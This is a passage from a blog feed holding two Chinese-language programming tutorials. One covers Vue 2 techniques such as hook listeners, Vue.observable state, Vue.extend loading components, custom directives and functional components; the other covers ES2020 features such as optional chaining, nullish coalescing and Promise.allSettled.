review</code>时候，技术大佬说了，这样有问题。</p><ul><li>大佬：这样写不是很好，应该将监听<code>resize</code>事件与销毁<code>resize</code>事件放到一起，现在两段代码分开而且相隔几百行代码，可读性比较差</li><li>我：那我把两个生命周期钩子函数位置换一下，放到一起?</li><li>大佬： <code>hook</code>听过没？</li><li>我：<code>Vue3.0</code>才有啊，咋，咱要升级<code>Vue</code>?</li></ul><p>然后技术大佬就不理我了,并向我扔过来一段代码</p><pre><code class="js">export default {  mounted() {    this.chart = echarts.init(this.$el)    // 请求数据，赋值数据 等等一系列操作...    // 监听窗口发生变化，resize组件    window.addEventListener(&#39;resize&#39;, this.$_handleResizeChart)    // 通过hook监听组件销毁钩子函数，并取消监听事件    this.$once(&#39;hook:beforeDestroy&#39;, () =&gt; {      window.removeEventListener(&#39;resize&#39;, this.$_handleResizeChart)    })  },  updated() {},  created() {},  methods: {    $_handleResizeChart() {      // this.chart.resize()    }  }}</code></pre><p>看完代码，恍然大悟，大佬不愧是大佬，原来<code>Vue</code>还可以这样监听生命周期函数。</p><blockquote><p>在Vue组件中，可以用过<code>$on,$once</code>去监听所有的生命周期钩子函数，如监听组件的<code>updated</code>钩子函数可以写成 <code>this.$on(&#39;hook:updated&#39;, () =&gt; {})</code></p></blockquote><h3 id="2-外部监听生命周期函数"><a href="#2-外部监听生命周期函数" class="headerlink" title="2. 外部监听生命周期函数"></a>2. 外部监听生命周期函数</h3><p>今天同事在公司群里问，想在外部监听组件的生命周期函数，有没有办法啊？</p><p>为什么会有这样的需求呢，原来同事用了一个第三方组件，需要监听第三方组件数据的变化，但是组件又没有提供<code>change</code>事件，同事也没办法了，才想出来要去在外部监听组件的<code>updated</code>钩子函数。查看了一番资料，发现<code>Vue支持在外部监听组件的生命周期钩子函数</code>。</p><pre><code class="html">&lt;template&gt;  &lt;!--通过@hook:updated监听组件的updated生命钩子函数--&gt;  &lt;!--组件的所有生命周期钩子都可以通过@hook:钩子函数名 来监听触发--&gt;  &lt;custom-select @hook:updated=&quot;$_handleSelectUpdated&quot; /&gt;&lt;/template&gt;&lt;script&gt;import CustomSelect from &#39;../components/custom-select&#39;export default {  components: {    CustomSelect  },  methods: {    $_handleSelectUpdated() {      console.log(&#39;custom-select组件的updated钩子函数被触发&#39;)    }  }}&lt;/script&gt;</code></pre><h2 id="小项目还用Vuex-用Vue-observable手写一个状态管理吧"><a href="#小项目还用Vuex-用Vue-observable手写一个状态管理吧" class="headerlink" title="小项目还用Vuex?用Vue.observable手写一个状态管理吧"></a>小项目还用Vuex?用Vue.observable手写一个状态管理吧</h2><p>在前端项目中，有许多数据需要在各个组件之间进行传递共享，这时候就需要有一个状态管理工具，一般情况下，我们都会使用<code>Vuex</code>，但对于小型项目来说，就像<code>Vuex</code>官网所说：“如果您不打算开发大型单页应用，使用 <code>Vuex</code> 可能是繁琐冗余的。确实是如此——如果您的应用够简单，您最好不要使用 <code>Vuex</code>”。这时候我们就可以使用Vue2.6提供的新API <code>Vue.observable</code>手动打造一个<code>Vuex</code></p><h3 id="创建-store"><a href="#创建-store" class="headerlink" title="创建 store"></a>创建 store</h3><pre><code class="js">import Vue from &#39;vue&#39;// 通过Vue.observable创建一个可响应的对象export const store = Vue.observable({  userInfo: {},  roleIds: []})// 定义 mutations, 修改属性export const mutations = {  setUserInfo(userInfo) {    store.userInfo = userInfo  },  setRoleIds(roleIds) {    store.roleIds = roleIds  }}</code></pre><h3 id="在组件中引用"><a href="#在组件中引用" class="headerlink" title="在组件中引用"></a>在组件中引用</h3><pre><code class="html">&lt;template&gt;  &lt;div&gt;    {{ userInfo.name }}  &lt;/div&gt;&lt;/template&gt;&lt;script&gt;import { store, mutations } from &#39;../store&#39;export default {  computed: {    userInfo() {      return store.userInfo    }  },  created() {    mutations.setUserInfo({      name: &#39;白告&#39;    })  }}&lt;/script&gt;</code></pre><h2 id="开发全局组件，你可能需要了解一下Vue-extend"><a href="#开发全局组件，你可能需要了解一下Vue-extend" class="headerlink" title="开发全局组件，你可能需要了解一下Vue.extend"></a>开发全局组件，你可能需要了解一下Vue.extend</h2><p><code>Vue.extend</code>是一个全局Api,平时我们在开发业务的时候很少会用到它，但有时候我们希望可以开发一些全局组件比如Loading,Notify,Message等组件时，这时候就可以使用<code>Vue.extend</code>。</p><p>同学们在使用<code>element-ui</code>的<code>loading</code>时，在代码中可能会这样写</p><pre><code class="js">// 显示loadingconst loading = this.$loading()// 关闭loadingloading.close()</code></pre><p>这样写可能没什么特别的，但是如果你这样写</p><pre><code class="js">const loading = this.$loading()const loading1 = this.$loading()setTimeout(() =&gt; {  loading.close()}, 1000 * 3)</code></pre><p>这时候你会发现，我调用了两次loading,但是只出现了一个，而且我只关闭了loading，但是loading1也被关闭了。这是怎么实现的呢？我们现在就是用Vue.extend + 单例模式去实现一个loading</p><h3 id="开发loading组件"><a href="#开发loading组件" class="headerlink" title="开发loading组件"></a>开发loading组件</h3><pre><code class="html">&lt;template&gt;  &lt;transition name=&quot;custom-loading-fade&quot;&gt;    &lt;!--loading蒙版--&gt;    &lt;div v-show=&quot;visible&quot; class=&quot;custom-loading-mask&quot;&gt;      &lt;!--loading中间的图标--&gt;      &lt;div class=&quot;custom-loading-spinner&quot;&gt;        &lt;i class=&quot;custom-spinner-icon&quot;&gt;&lt;/i&gt;        &lt;!--loading上面显示的文字--&gt;        &lt;p class=&quot;custom-loading-text&quot;&gt;{{ text }}&lt;/p&gt;      &lt;/div&gt;    &lt;/div&gt;  &lt;/transition&gt;&lt;/template&gt;&lt;script&gt;export default {  props: {  // 是否显示loading    visible: {      type: Boolean,      default: false    },    // loading上面的显示文字    text: {      type: String,      default: &#39;&#39;    }  }}&lt;/script&gt;</code></pre><h3 id="通过Vue-extend将组件转换为全局组件"><a href="#通过Vue-extend将组件转换为全局组件" class="headerlink" title="通过Vue.extend将组件转换为全局组件"></a>通过Vue.extend将组件转换为全局组件</h3><h4 id="改造loading组件，将组件的props改为data"><a href="#改造loading组件，将组件的props改为data" class="headerlink" title="改造loading组件，将组件的props改为data"></a>改造loading组件，将组件的props改为data</h4><pre><code class="js">export default {  data() {    return {      text: &#39;&#39;,      visible: false    }  }}</code></pre><h4 id="通过Vue-extend改造组件"><a href="#通过Vue-extend改造组件" class="headerlink" title="通过Vue.extend改造组件"></a>通过Vue.extend改造组件</h4><pre><code class="js">// loading/index.jsimport Vue from &#39;vue&#39;import LoadingComponent from &#39;./loading.vue&#39;// 通过Vue.extend将组件包装成一个子类const LoadingConstructor = Vue.extend(LoadingComponent)let loading = undefinedLoadingConstructor.prototype.close = function() {  // 如果loading 有引用，则去掉引用  if (loading) {    loading = undefined  }  // 先将组件隐藏  this.visible = false  // 延迟300毫秒，等待loading关闭动画执行完之后销毁组件  setTimeout(() =&gt; {    // 移除挂载的dom元素    if (this.$el &amp;&amp; this.$el.parentNode) {      this.$el.parentNode.removeChild(this.$el)    }    // 调用组件的$destroy方法进行组件销毁    this.$destroy()  }, 300)}const Loading = (options = {}) =&gt; {  // 如果组件已渲染，则返回即可  if (loading) {    return loading  }  // 要挂载的元素  const parent = document.body  // 组件属性  const opts = {    text: &#39;&#39;,    ...options  }  // 通过构造函数初始化组件 相当于 new Vue()  const instance = new LoadingConstructor({    el: document.createElement(&#39;div&#39;),    data: opts  })  // 将loading元素挂在到parent上面  parent.appendChild(instance.$el)  // 显示loading  Vue.nextTick(() =&gt; {    instance.visible = true  })  // 将组件实例赋值给loading  loading = instance  return instance}export default Loading</code></pre><h4 id="在页面使用loading"><a href="#在页面使用loading" class="headerlink" title="在页面使用loading"></a>在页面使用loading</h4><pre><code class="js">import Loading from &#39;./loading/index.js&#39;export default {  created() {    const loading = Loading({ text: &#39;正在加载。。。&#39; })    // 三秒钟后关闭    setTimeout(() =&gt; {      loading.close()    }, 3000)  }}</code></pre><p>通过上面的改造，<code>loading</code>已经可以在全局使用了，如果需要像<code>element-ui</code>一样挂载到<code>Vue.prototype</code>上面，通过<code>this.$loading</code>调用，还需要改造一下</p><h3 id="将组件挂载到Vue-prototype上面"><a href="#将组件挂载到Vue-prototype上面" class="headerlink" title="将组件挂载到Vue.prototype上面"></a>将组件挂载到Vue.prototype上面</h3><pre><code class="js">Vue.prototype.$loading = Loading// 在export之前将Loading方法进行绑定export default Loading// 在组件内使用this.$loading()</code></pre><h2 id="自定义指令，从底层解决问题"><a href="#自定义指令，从底层解决问题" class="headerlink" title="自定义指令，从底层解决问题"></a>自定义指令，从底层解决问题</h2><p>通过上一节我们开发了一个<code>loading</code>组件，开发完之后，其他开发在使用的时候又提出来了两个需求</p><p>1.可以将<code>loading</code>挂载到某一个元素上面，现在只能是全屏使用<br>2.可以使用指令在指定的元素上面挂载<code>loading</code></p><h3 id="开发v-loading指令"><a href="#开发v-loading指令" class="headerlink" title="开发v-loading指令"></a>开发v-loading指令</h3><pre><code class="js">import Vue from &#39;vue&#39;import LoadingComponent from &#39;./loading&#39;// 使用 Vue.extend构造组件子类const LoadingContructor = Vue.extend(LoadingComponent)// 定义一个名为loading的指令Vue.directive(&#39;loading&#39;, {  /**   * 只调用一次，在指令第一次绑定到元素时调用，可以在这里做一些初始化的设置   * @param {*} el 指令要绑定的元素   * @param {*} binding 指令传入的信息，包括 {name:&#39;指令名称&#39;, value: &#39;指令绑定的值&#39;,arg: &#39;指令参数 v-bind:text 对应 text&#39;}   */  bind(el, binding) {    const instance = new LoadingContructor({      el: document.createElement(&#39;div&#39;),      data: {}    })    el.appendChild(instance.$el)    el.instance = instance    Vue.nextTick(() =&gt; {      el.instance.visible = binding.value    })  },  /**   * 所在组件的 VNode 更新时调用   * @param {*} el   * @param {*} binding   */  update(el, binding) {    // 通过对比值的变化判断loading是否显示    if (binding.oldValue !== binding.value) {      el.instance.visible = binding.value    }  },  /**   * 只调用一次，在 指令与元素解绑时调用   * @param {*} el   */  unbind(el) {    const mask = el.instance.$el    if (mask.parentNode) {      mask.parentNode.removeChild(mask)    }    el.instance.$destroy()    el.instance = undefined  }})</code></pre><h3 id="在元素上面使用指令"><a href="#在元素上面使用指令" class="headerlink" title="在元素上面使用指令"></a>在元素上面使用指令</h3><pre><code class="html">&lt;template&gt;  &lt;div v-loading=&quot;visible&quot;&gt;&lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default {  data() {    return {      visible: false    }  },  created() {    this.visible = true    fetch().then(() =&gt; {      this.visible = false    })  }}&lt;/script&gt;</code></pre><h3 id="项目中哪些场景可以自定义指令"><a href="#项目中哪些场景可以自定义指令" class="headerlink" title="项目中哪些场景可以自定义指令"></a>项目中哪些场景可以自定义指令</h3><p>1.为组件添加<code>loading</code>效果<br>2.按钮级别权限控制 <code>v-permission</code><br>3.代码埋点,根据操作类型定义指令<br>4.input输入框自动获取焦点<br>5.其他等等。。。</p><h2 id="深度watch与watch立即触发回调-我可以监听到你的一举一动"><a href="#深度watch与watch立即触发回调-我可以监听到你的一举一动" class="headerlink" title="深度watch与watch立即触发回调,我可以监听到你的一举一动"></a>深度watch与watch立即触发回调,我可以监听到你的一举一动</h2><p>在开发Vue项目时，我们会经常性的使用到watch去监听数据的变化，然后在变化之后做一系列操作。</p><h3 id="基础用法"><a href="#基础用法" class="headerlink" title="基础用法"></a>基础用法</h3><p>比如一个列表页，我们希望用户在搜索框输入搜索关键字的时候，可以自动触发搜索,此时除了监听搜索框的<code>change</code>事件之外，我们也可以通过<code>watch</code>监听搜索关键字的变化</p><pre><code class="html">&lt;template&gt;  &lt;!--此处示例使用了element-ui--&gt;  &lt;div&gt;    &lt;div&gt;      &lt;span&gt;搜索&lt;/span&gt;      &lt;input v-model=&quot;searchValue&quot; /&gt;    &lt;/div&gt;    &lt;!--列表，代码省略--&gt;  &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default {  data() {    return {      searchValue: &#39;&#39;    }  },  watch: {    // 在值发生变化之后，重新加载数据    searchValue(newValue, oldValue) {      // 判断搜索      if (newValue !== oldValue) {        this.$_loadData()      }    }  },  methods: {    $_loadData() {      // 重新加载数据，此处需要通过函数防抖    }  }}&lt;/script&gt;</code></pre><h3 id="立即触发"><a href="#立即触发" class="headerlink" title="立即触发"></a>立即触发</h3><p>通过上面的代码，现在已经可以在值发生变化的时候触发加载数据了，但是如果要在页面初始化时候加载数据，我们还需要在<code>created</code>或者<code>mounted</code>生命周期钩子里面再次调用<code>$_loadData</code>方法。不过，现在可以不用这样写了，通过配置<code>watch</code>的立即触发属性，就可以满足需求了</p><pre><code class="js">// 改造watchexport default {  watch: {    // 在值发生变化之后，重新加载数据    searchValue: {    // 通过handler来监听属性变化, 初次调用 newValue为&quot;&quot;空字符串， oldValue为 undefined      handler(newValue, oldValue) {        if (newValue !== oldValue) {          this.$_loadData()        }      },      // 配置立即执行属性      immediate: true    }  }}</code></pre><h3 id="深度监听（我可以看到你内心的一举一动）"><a href="#深度监听（我可以看到你内心的一举一动）" class="headerlink" title="深度监听（我可以看到你内心的一举一动）"></a>深度监听（我可以看到你内心的一举一动）</h3><p>一个表单页面，需求希望用户在修改表单的任意一项之后，表单页面就需要变更为被修改状态。如果按照上例中watch的写法，那么我们就需要去监听表单每一个属性，太麻烦了，这时候就需要用到<code>watch</code>的深度监听<code>deep</code></p><pre><code class="js">export default {  data() {    return {      formData: {        name: &#39;&#39;,        sex: &#39;&#39;,        age: 0,        deptId: &#39;&#39;      }    }  },  watch: {    // 在值发生变化之后，重新加载数据    formData: {      // 需要注意，因为对象引用的原因， newValue和oldValue的值一直相等      handler(newValue, oldValue) {        // 在这里标记页面编辑状态      },      // 通过指定deep属性为true, watch会监听对象里面每一个值的变化      deep: true    }  }}</code></pre><h2 id="函数式组件，函数是组件？"><a href="#函数式组件，函数是组件？" class="headerlink" title="函数式组件，函数是组件？"></a>函数式组件，函数是组件？</h2><p>什么是函数式组件？函数式组件就是函数是组件，感觉在玩文字游戏。使用过React的同学，应该不会对函数式组件感到陌生。函数式组件，我们可以理解为没有内部状态，没有生命周期钩子函数，没有this(不需要实例化的组件)。</p><p>在日常写bug的过程中，经常会开发一些纯展示性的业务组件，比如一些详情页面，列表界面等，它们有一个共同的特点是只需要将外部传入的数据进行展现，不需要有内部状态，不需要在生命周期钩子函数里面做处理，这时候你就可以考虑使用函数式组件。</p><h3 id="先来一个函数式组件的代码"><a href="#先来一个函数式组件的代码" class="headerlink" title="先来一个函数式组件的代码"></a>先来一个函数式组件的代码</h3><pre><code class="js">export default {  // 通过配置functional属性指定组件为函数式组件  functional: true,  // 组件接收的外部属性  props: {    avatar: {      type: String    }  },  /**   * 渲染函数   * @param {*} h   * @param {*} context 函数式组件没有this, props, slots等都在context上面挂着   */  render(h, context) {    const { props } = context    if (props.avatar) {      return &lt;img src={props.avatar}&gt;&lt;/img&gt;    }    return &lt;img src=&quot;default-avatar.png&quot;&gt;&lt;/img&gt;  }}</code></pre><p>在上例中，我们定义了一个头像组件，如果外部传入头像，则显示传入的头像，否则显示默认头像。上面的代码中大家看到有一个<code>render</code>函数，这个是Vue使用<code>JSX</code>的写法，关于<code>JSX</code>,小编将在后续文章中会出详细的使用教程。</p><h3 id="为什么使用函数式组件"><a href="#为什么使用函数式组件" class="headerlink" title="为什么使用函数式组件"></a>为什么使用函数式组件</h3><p>1.最主要最关键的原因是函数式组件不需要实例化，无状态，没有生命周期，所以渲染性能要好于普通组件<br>2.函数式组件结构比较简单，代码结构更清晰</p><h3 id="函数式组件与普通组件的区别"><a href="#函数式组件与普通组件的区别" class="headerlink" title="函数式组件与普通组件的区别"></a>函数式组件与普通组件的区别</h3><p>1.函数式组件需要在声明组件是指定functional<br>2.函数式组件不需要实例化，所以没有this,this通过render函数的第二个参数来代替<br>3.函数式组件没有生命周期钩子函数，不能使用计算属性，watch等等<br>4.函数式组件不能通过$emit对外暴露事件，调用事件只能通过context.listeners.click的方式调用外部传入的事件<br>5.因为函数式组件是没有实例化的，所以在外部通过ref去引用组件时，实际引用的是HTMLElement<br>6.函数式组件的props可以不用显示声明，所以没有在props里面声明的属性都会被自动隐式解析为prop,而普通组件所有未声明的属性都被解析到$attrs里面，并自动挂载到组件根元素上面(可以通过inheritAttrs属性禁止)</p><h3 id="我不想用JSX，能用函数式组件吗？"><a href="#我不想用JSX，能用函数式组件吗？" class="headerlink" title="我不想用JSX，能用函数式组件吗？"></a>我不想用JSX，能用函数式组件吗？</h3><p>在<code>Vue2.5</code>之前，使用函数式组件只能通过<code>JSX</code>的方式，在之后，可以通过模板语法来生命函数式组件</p><pre><code class="html">&lt;!--在template 上面添加 functional属性--&gt;&lt;template functional&gt;  &lt;img :src=&quot;props.avatar ? props.avatar : &#39;default-avatar.png&#39;&quot; /&gt;&lt;/template&gt;&lt;!--根据上一节第六条，可以省略声明props--&gt;</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;https://juejin.im/post/5eef7799f265da02cd3b82fe?utm_source=gold_browser_extension&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;原文地址&lt;/a&gt;&lt;/p&gt;
&lt;
      
    
    </summary>
    
      <category term="Vue" scheme="https://zhanghao-web.github.io/categories/Vue/"/>
    
    
      <category term="Vue" scheme="https://zhanghao-web.github.io/tags/Vue/"/>
    
  </entry>
  
  <entry>
    <title>ES2020的新功能</title>
    <link href="https://zhanghao-web.github.io/2020/05/25/Js/ES2020%E7%9A%84%E6%96%B0%E5%8A%9F%E8%83%BD/"/>
    <id>https://zhanghao-web.github.io/2020/05/25/Js/ES2020的新功能/</id>
    <published>2020-05-25T11:00:30.000Z</published>
    <updated>2020-05-25T11:17:09.395Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://juejin.im/post/5eca8607e51d457890602072?utm_source=gold_browser_extension#heading-15" target="_blank" rel="noopener">原文地址</a></p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>近年来，JavaScript 的发展非常迅速。 尤其是在2015 年 ES6 发布之后，情况变得更好。</p><p>现在 许多新的特性被提议包括在 <code>ES2020</code>版本中。好消息是这些已经已经敲定。 现在，我们获得了最终定稿的功能清单，它们将在被批准发布之后出现在备受期待的 <code>ES2020</code> 中。 其中一些功能使我非常兴奋，因为在它们存在之前编写代码时遇到将会遇到很多麻烦。 让我们看看它们是什么吧！</p><h2 id="可选链操作符（Optional-Chaining-Operator）"><a href="#可选链操作符（Optional-Chaining-Operator）" class="headerlink" title="可选链操作符（Optional Chaining Operator）"></a>可选链操作符（Optional Chaining Operator）</h2><p>对我个人来说，这是 ES2020最令人兴奋的特点之一。 我已经编写了很多程序，这些程序将会从这个新特性中获益匪浅。</p><p>可选链操作符<strong>允许您安全地访问对象的深嵌套属性，而不必检查每个属性是否存在</strong>。 让我们看看这个特性对我们有什么帮助。</p><h3 id="拥有可选链操作符之前"><a href="#拥有可选链操作符之前" class="headerlink" title="拥有可选链操作符之前"></a>拥有可选链操作符之前</h3><pre><code class="js">const user = {  firstName: &quot;Joseph&quot;,  lastName: &quot;Kuruvilla&quot;,  age: 38,  address: {    number: &quot;239&quot;,    street: &quot;Ludwig Lane&quot;,    city: &quot;Chennai&quot;,    zip: &quot;600028&quot;,    prop1: {      prop2: {        prop3: {          prop4: {            value: &quot;sample&quot;,          },        },      },    },  },};if (user &amp;&amp; user.address) {  console.log(user.address.zip);  //600028}if (  user &amp;&amp;  user.address &amp;&amp;  user.address.prop1 &amp;&amp;  user.address.prop1.prop2 &amp;&amp;  user.address.prop1.prop2.prop3 &amp;&amp;  user.address.prop1.prop2.prop3.prop4) {  console.log(user.address.prop1.prop2.prop3.prop4.value);  //sample}//Accessing unexisting propertyconsole.log(user.address.prop102.po);//Error</code></pre><p>正如您在上面看到的，您<strong>必须检查每个级别中是否存在该属性，以避免出现无法读取未定义属性“ po”的错误</strong>。 随着嵌套级别的增加，手动检查的属性数量也会增加。 这意味着我们必须检查每个级别，以确保它不会在遇到未定义或空对象时崩溃。</p><h3 id="拥有可选链式操作符之后"><a href="#拥有可选链式操作符之后" class="headerlink" title="拥有可选链式操作符之后"></a>拥有可选链式操作符之后</h3><p>随着<code>可选链式操作符 (Optional Chaining)</code> 的引入，我们前端的工作变得容易多了。 通过简单地使用可选链式操作符  <code>?.</code>  我们可以访问深嵌套的对象，而不必检查未定义或空对象。</p><pre><code class="js">const user = {  firstName: &quot;Joseph&quot;,  lastName: &quot;Kuruvilla&quot;,  age: 38,  address: {    number: &quot;239&quot;,    street: &quot;Ludwig Lane&quot;,    city: &quot;Chennai&quot;,    zip: &quot;600028&quot;,    prop1: {      prop2: {        prop3: {          prop4: {            value: &quot;sample&quot;,          },        },      },    },  },};console.log(user?.address?.zip);// 600028console.log(user?.address?.prop1?.prop2?.prop3?.prop4?.value);// sample//Accessing unexisting propertyconsole.log(user?.address?.prop102?.po);//undefined</code></pre><h2 id="空值合并操作符（Nullish-coalescing-operator）"><a href="#空值合并操作符（Nullish-coalescing-operator）" class="headerlink" title="空值合并操作符（Nullish coalescing operator）"></a>空值合并操作符（Nullish coalescing operator）</h2><p>这是另一个令我兴奋的功能，当我第一次在<strong>proposal stage</strong>， 了解到的时候，我由衷的喜欢这个特性，因为我已经历了编写单独的函数来手动检查这个特性的麻烦。</p><p><code>空值合并操作符</code>允许您检查  <code>nullish</code>  值而不是  <code>falsey</code>  值。 <code>Nullish</code> 值是指  <code>null 或 undefined</code> 的值。 而 falsey 值是诸如<code>空字符串、数字0、  undefined 、  null 、  false 、  NaN</code>  等等的值。 这对你来说可能听起来没什么不同，但是在现实中，这意味着很多。</p><h3 id="在有空值合并操作符之前"><a href="#在有空值合并操作符之前" class="headerlink" title="在有空值合并操作符之前"></a>在有空值合并操作符之前</h3><p>我最近做了一个项目，我需要允许黑暗模式（Dark Mode）切换功能。 我必须检查输入是  <code>true</code> 还是  <code>false</code> 。 如果用户没有设置任何值，则默认为  <code>true</code> 。 下面就是我如何在有<code>空值合并操作符</code>之前实现它的：</p><pre><code class="js">const darkModePreference1 = true;const darkModePreference2 = false;const darkModePreference3 = undefined;const darkModePreference4 = null;const getUserDarkModePreference = (darkModePreference) =&gt; {  if (darkModePreference || darkModePreference === false) {    return darkModePreference;  }  return true;};getUserDarkModePreference(darkModePreference1);// truegetUserDarkModePreference(darkModePreference2);// falsegetUserDarkModePreference(darkModePreference3);// truegetUserDarkModePreference(darkModePreference4);// true</code></pre><h3 id="在有空值合并操作符之后"><a href="#在有空值合并操作符之后" class="headerlink" title="在有空值合并操作符之后"></a>在有空值合并操作符之后</h3><p>在有空值合并操作符之后，您所要做的就是使用  <code>??</code>  操作符。不需要  <code>if</code>  语句：\</p><pre><code class="js">const darkModePreference1 = true;const darkModePreference2 = false;const darkModePreference3 = undefined;const darkModePreference4 = null;const getUserDarkModePreference = (darkModePreference) =&gt; {  return darkModePreference ?? true;};getUserDarkModePreference(darkModePreference1);// truegetUserDarkModePreference(darkModePreference2);// falsegetUserDarkModePreference(darkModePreference3);// truegetUserDarkModePreference(darkModePreference4);// true</code></pre><p>这里基本上发生的情况是，如果变量 darkModePreference 包含一个  <code>nullish</code>  值，那么将值 <code>true</code> 赋给它。 简单，简短，易于理解。</p><h2 id="动态-import（Dynamic-Imports）"><a href="#动态-import（Dynamic-Imports）" class="headerlink" title="动态 import（Dynamic Imports）"></a>动态 import（Dynamic Imports）</h2><p>这个特性将帮助您的应用程序更加高效的执行， <code>动态 import</code> 允许您将 JS 文件作为原生应用用程序中的模块动态导入。 在 <code>ES2020</code>之前，不管是否使用模块，都应该导入模块。<br>例如，假设我们需要添加一个功能来下载 pdf 格式的文件。<br>让我们看看如何在 <code>动态 import</code> 之前和之后实现这一点。</p><h3 id="在-动态-import-之前"><a href="#在-动态-import-之前" class="headerlink" title="在 动态 import  之前"></a>在 动态 import  之前</h3><p>实际上，不会所有的页面访问者使用下载 pdf 的选项。 但是，无论我们的访客是否使用它，它仍然需要被导入。 这意味着这个 pdf 模块也可以在页面加载期间被下载。</p><pre><code class="js">import { exportAsPdf } from &quot;./export-as-pdf.js&quot;;const exportPdfButton = document.querySelector(&quot;.exportPdfBtn&quot;);exportPdfButton.addEventListener(&quot;click&quot;, exportAsPdf);</code></pre><p>这种开销可以通过使用<code>延迟加载模块（lazy loaded modules</code>）来减少。 可以通过称为<code>代码分割 （code-splitting）</code>的方法来实现，这在 Webpack 或其他模块打包工具已经可以使用了。<br>但是对于 ES2020，我们可以直接使用它了，而不需要模块打包工具，如 Webpack。</p><h3 id="在动态导入（动态-import）之后"><a href="#在动态导入（动态-import）之后" class="headerlink" title="在动态导入（动态 import）之后"></a>在动态导入（动态 import）之后</h3><pre><code class="js">const exportPdfButton = document.querySelector(&#39;.exportPdfBtn&#39;);exportPdfButton.addEventListener(&#39;click&#39;, () =&gt; {  import(&#39;./export-as-pdf.js&#39;)    .then(module =&gt; {      module.exportAsPdf()    })    .catch(err =&gt; {      // handle the error if the module fails to load    })})</code></pre><p>正如您在上面的代码中看到的，现在只有在需要模块时才延迟加载模块。 从而减少开销和页面加载时间。</p><h3 id="Promise-allSettled"><a href="#Promise-allSettled" class="headerlink" title="Promise.allSettled"></a>Promise.allSettled</h3><p>如果你有一个场景，在所有 <code>Promise</code> 都完成之后必须执行一个任务，那么你可能使用  <code>Promise.all()</code> 方法。 但是这个方法有一个缺点。 当你的任何一个 <code>Promise</code> 被 <code>Rejected</code> 时，<code>Promise</code> 方法就会抛出一个错误。 这意味着您的代码不会等到所有的 <code>Promise</code> 都完成。<br>这可能不是你想要的。 如果你想要这样的东西: “我不在乎他们的结果。 只需全部运行” ，那么你可以使用新的  <code>Promise.allSettled()</code> 方法。 这种方法只有在你的所有 Promise 都  <code>settled</code> ーー 要么  <code>Resolved</code> ，要么  <code>Rejected</code> ーー 时才会  <code>Resolved</code> 。</p><h3 id="在拥有-Promise-allSettled-之前"><a href="#在拥有-Promise-allSettled-之前" class="headerlink" title="在拥有 Promise.allSettled 之前"></a>在拥有 Promise.allSettled 之前</h3><pre><code class="js">const PromiseArray = [  Promise.resolve(100),  Promise.reject(null),  Promise.resolve(&quot;Data release&quot;),  Promise.reject(new Error(&quot;Something went wrong&quot;)),];Promise.all(PromiseArray)  .then((data) =&gt;    console.log(&quot;all resolved! here are the resolve values:&quot;, data)  )  .catch((err) =&gt; console.log(&quot;got rejected! reason:&quot;, err));//got rejected! reason: null</code></pre><p>如上所述，当其中一个 Promise 被  rejected 时， Promise 就会抛出错误。</p><h3 id="在拥有-Promise-allSettled-之后"><a href="#在拥有-Promise-allSettled-之后" class="headerlink" title="在拥有 Promise.allSettled 之后"></a>在拥有 Promise.allSettled 之后</h3><pre><code class="js">const PromiseArray = [  Promise.resolve(100),  Promise.reject(null),  Promise.resolve(&quot;Data release&quot;),  Promise.reject(new Error(&quot;Something went wrong&quot;)),];Promise.allSettled(PromiseArray)  .then((res) =&gt; {    console.log(res);  })  .catch((err) =&gt; console.log(err));//[//  {status: &quot;fulfilled&quot;, value: 100},//  {status: &quot;rejected&quot;, reason: null},//  {status: &quot;fulfilled&quot;, value: &quot;Data release&quot;},//  {status: &quot;rejected&quot;, reason: Error: Something went wrong ...}//]</code></pre><p>尽管有些 Promise 被 rejected 了，Promise.allSettled 返回了所有的 Promise 的结果</p><h2 id="globalThis"><a href="#globalThis" class="headerlink" title="globalThis"></a>globalThis</h2><p><code>globalThis</code>  包含对全局对象的引用，与环境无关。 在浏览器中，全局对象是  <code>window 对象</code>。 在 Node 环境中，全局对象是   <code>global</code> 或者 Web workers 中的  <code>self</code>。</p><h3 id="在拥有-globalThis-之前"><a href="#在拥有-globalThis-之前" class="headerlink" title="在拥有 globalThis 之前"></a>在拥有 globalThis 之前</h3><p>我们在工作中会有需要编写一份同时运行在 Node 和浏览器中的通用代码，当我们要取得全局对象时，通常需要做很多工作和逻辑判断：</p><pre><code class="js">beforeGlobalThis = (typeof window !== &quot;undefined&quot;? window: (typeof process === &#39;object&#39; &amp;&amp;   typeof require === &#39;function&#39; &amp;&amp;   typeof global === &#39;object&#39;)    ? global    : this);beforeGlobalThis.tuture = &#39;小若燕雀，亦可一展宏图&#39;;</code></pre><h2 id="在拥有-globalThis-之后"><a href="#在拥有-globalThis-之后" class="headerlink" title="在拥有 globalThis 之后"></a>在拥有 globalThis 之后</h2><p>我们可以直接使用 <code>globalThis</code> 去引用全局对象，而不用去担心环境的问题：</p><pre><code class="js">globalThis.tuture = &#39;小若燕雀，亦可一展宏图&#39;;</code></pre><p>上面的代码在浏览器或者 Node 环境中都是通用的，你可以放心使用！</p><h2 id="BigInt"><a href="#BigInt" class="headerlink" title="BigInt"></a>BigInt</h2><p>允许您使用大于 <code>Javascript</code> 中允许的最大值的数字。 这个数字是 <code>pow(2,53)-1</code> 。 尽管这不能向后兼容，因为传统的数字系统<code>(IEEE 754)</code>不能支持这种大小的数字。</p><h2 id="String-matchall"><a href="#String-matchall" class="headerlink" title="String.matchall"></a>String.matchall</h2><p><code>matchAll()</code> 是一个与<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Regular_Expressions" target="_blank" rel="noopener">正则表达式</a>相关的方法。 此方法返回与正则表达式匹配的字符串的所有结果的<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Iterators_and_Generators" target="_blank" rel="noopener">迭代器</a>，包括捕获组。 这个方法已经被添加到 String 原型中。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;https://juejin.im/post/5eca8607e51d457890602072?utm_source=gold_browser_extension#heading-15&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;原文地
      
    
    </summary>
    
      <category term="Js" scheme="https://zhanghao-web.github.io/categories/Js/"/>
    
    
      <category term="Js" scheme="https://zhanghao-web.github.io/tags/Js/"/>
    
  </entry>
  
